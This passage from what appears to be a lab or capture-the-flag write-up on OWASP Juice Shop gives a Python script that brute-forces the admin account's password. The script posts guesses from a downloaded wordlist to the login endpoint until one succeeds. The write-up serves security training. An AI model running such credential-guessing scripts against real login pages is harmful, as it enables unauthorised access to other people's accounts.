### 4. Who broke my lock?!

-   Question #1: Bruteforce the Administrator account's password!
-   Instead of using Burp Suite, I create my `exploit.py`, if you doesn't have `best1050.txt` pass list, download here: https://weakpass.com/wordlists/best1050.txt. My Python script:

```python
import requests


target_url = "http://10.49.170.180/rest/user/login"


with open('.../best1050.txt', 'r') as file:
   for line in file:
       passw = line.strip()
       print('Tried ', passw)
       res = requests.post(target_url, data={"email": "admin@juice-sh.op", "password": passw})


       if "Invalid email or password." not in res.text:
           print()
           print("found pass: ", passw)
           print(res.text)
           break
```
